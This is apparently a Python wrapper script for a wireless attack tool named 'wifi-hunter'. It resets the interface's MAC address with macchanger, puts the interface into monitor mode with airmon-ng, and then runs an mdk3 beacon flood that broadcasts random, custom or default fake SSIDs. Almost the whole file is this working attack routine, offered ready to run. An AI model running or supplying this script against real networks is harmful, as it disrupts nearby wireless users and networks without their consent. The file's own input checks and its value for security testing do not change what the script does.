import os
import re
import subprocess
from banner import banners

INTERFACE_RE = re.compile(r"^[A-Za-z0-9._-]{1,32}$")


def validate_interface(name):
    name = name.strip()
    if not INTERFACE_RE.match(name):
        print("\033[91m[!] Invalid interface name. Only letters, digits, '.', '_' and '-' are allowed.\033[00m")
        exit(1)
    return name


banners()
print('\n\n\033[92m Your interfaces : \n\033[00m')
os.system('bash core/interface_device.sh')
print("\n\n")


def main_option(no, name):
    print(f"\n\033[91m [\033[00m{no}\033[91m] \033[93m{name}")


main_option(1, "Use Random SSIDS (slow)")
main_option(2, "Use custom SSIDS")
main_option(3, "Use default SSIDS")
main_option(0, "Exit")
print("\n\n\033[91m Choose an option : ")
try:
    option = int(input("\n\n\033[92m ͟w͟i͟f͟i͟-͟h͟u͟n͟t͟e͟r͟ > "))
except ValueError:
    print("\033[91m Wrong try again!")
    exit()
print("\n\n\033[91m[\033[00m*\033[91m] Type your wireless interface name : \033[00m")
option2 = validate_interface(input("\n\n\033[92m ͟w͟i͟f͟i͟-͟h͟u͟n͟t͟e͟r͟ > "))
print("\n\n\033[91m[\033[00m*\033[91m] Turning on monitor mode\033[00m")
with open(os.devnull, "wb") as devnull:
    subprocess.run(["macchanger", "-p", option2], stdout=devnull, stderr=devnull)
subprocess.run(["sudo", "airmon-ng", "check", "kill"])
subprocess.run(["sudo", "airmon-ng", "start", option2])
print("\n\033[91m[\033[00m*\033[91m] Starting process...\033[00m")
if option == 1:
    subprocess.run(["sudo", "mdk3", option2, "b", "-100", "DH141"])
elif option == 2:
    print("\n\n\033[91m Type File Location  : ")
    filename = input("\n\n\033[92m ͟w͟i͟f͟i͟-͟h͟u͟n͟t͟e͟r͟ > ").strip()
    if not os.path.isfile(filename):
        print("\033[91m[!] File not found.\033[00m")
        exit(1)
    subprocess.run(["sudo", "mdk3", option2, "b", "-c", "1", "-f", filename])
elif option == 3:
    subprocess.run(["sudo", "mdk3", option2, "b", "-c", "1", "-f", "core/ssid.txt"])
else:
    exit()